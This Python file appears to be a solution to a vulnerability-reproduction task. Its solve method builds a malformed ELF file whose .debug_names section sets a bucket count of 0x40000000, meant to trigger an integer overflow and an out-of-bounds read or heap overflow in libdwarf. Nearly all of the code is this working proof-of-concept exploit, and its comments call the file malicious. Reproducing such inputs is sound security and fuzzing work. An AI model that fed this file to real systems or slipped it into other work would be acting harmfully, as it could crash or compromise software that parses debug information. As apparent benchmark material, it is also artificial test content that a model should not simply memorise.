import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a malicious ELF file with a crafted .debug_names section
        # designed to trigger a heap buffer overflow in libdwarf via integer overflow.
        
        # ELF64 Header
        # e_ident: Magic + Class(2=64bit) + Data(1=LSB) + Version(1)
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        e_type = 1  # ET_REL (Relocatable file)
        e_machine = 62  # AMD64
        e_version = 1
        e_entry = 0
        e_phoff = 0
        e_shoff = 64  # Section headers follow immediately after ELF header
        e_flags = 0
        e_ehsize = 64
        e_phentsize = 0
        e_phnum = 0
        e_shentsize = 64
        e_shnum = 3  # Null, .debug_names, .shstrtab
        e_shstrndx = 2
        
        elf_hdr = struct.pack('<16sHHIQQQIHHHHHH', e_ident, e_type, e_machine, e_version,
                              e_entry, e_phoff, e_shoff, e_flags, e_ehsize,
                              e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx)
        
        # .debug_names payload
        # The vulnerability involves internal limit calculations.
        # By setting bucket_count to 0x40000000, the size calculation (count * 4) 
        # wraps to 0 in 32-bit arithmetic, potentially bypassing validation checks.
        # However, the loop iterating over buckets runs 0x40000000 times, causing OOB read.
        
        dn_version = 5
        dn_padding = b'\x00\x00'
        dn_comp_unit_count = 0
        dn_local_type_unit_count = 0
        dn_foreign_type_unit_count = 0
        dn_bucket_count = 0x40000000  # The malicious value
        dn_name_count = 0
        dn_abbrev_table_size = 0
        dn_aug_str_size = 0
        
        # Pack the body of .debug_names
        dn_body = struct.pack('<H2sIIIIIIII', dn_version, dn_padding,
                              dn_comp_unit_count, dn_local_type_unit_count, dn_foreign_type_unit_count,
                              dn_bucket_count, dn_name_count, dn_abbrev_table_size, dn_aug_str_size)
        
        # Prepend unit_length (4 bytes for 32-bit DWARF)
        dn_length = len(dn_body)
        dn_data = struct.pack('<I', dn_length) + dn_body
        
        # .shstrtab content
        shstrtab_data = b'\x00.debug_names\x00.shstrtab\x00'
        # Offsets in shstrtab
        name_dn = 1
        name_shstrtab = 14
        
        # Calculate offsets
        offset_headers_end = 64 + 64 * 3
        offset_dn = offset_headers_end
        offset_shstrtab = offset_dn + len(dn_data)
        
        # Section Headers
        # 0: Null Section
        sh_null = b'\x00' * 64
        
        # 1: .debug_names Section
        # sh_type=1 (PROGBITS)
        sh_dn = struct.pack('<IIQQQQIIQQ', name_dn, 1, 0, 0, offset_dn, len(dn_data), 0, 0, 1, 0)
        
        # 2: .shstrtab Section
        # sh_type=3 (STRTAB)
        sh_shstrtab = struct.pack('<IIQQQQIIQQ', name_shstrtab, 3, 0, 0, offset_shstrtab, len(shstrtab_data), 0, 0, 1, 0)
        
        # Assemble ELF
        return elf_hdr + sh_null + sh_dn + sh_shstrtab + dn_data + shstrtab_data